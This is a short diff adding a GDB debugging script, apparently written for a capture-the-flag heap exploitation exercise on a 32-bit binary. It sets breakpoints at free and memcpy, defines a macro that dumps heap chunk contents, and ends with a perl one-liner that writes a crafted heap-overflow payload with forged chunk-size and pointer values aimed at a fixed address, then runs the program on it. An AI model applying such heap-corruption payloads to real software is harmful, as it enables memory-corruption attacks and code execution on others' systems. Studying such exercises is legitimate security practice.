@@ -1,0 +1,25 @@
+set follow-fork-mode child
+
+deactive alarm
+
+def show_heap
+  printf "array[10].ptr begin\n"
+  x/8xw *(int*)($esp+0x60)
+  printf "array[10].ptr end-0x10\n"
+  x/8xw *(int*)($esp+0x60)+0x104-0x10
+  printf "array[11].ptr begin\n"
+  x/8xw *(int*)($esp+0x68)
+  printf "array[11].ptr end-0x10\n"
+  x/8xw *(int*)($esp+0x68)+0x104-0x10
+end
+
+# free
+b *0x8048afa
+ignore 2 0x0a
+
+# memcpy
+b *0x8048aa6
+
+shell perl -e 'print "\x00"x260 . pack("III<", 0xfffffffd, 0x0804c004-8, 0xffffffff)'> pwn
+r < pwn
+
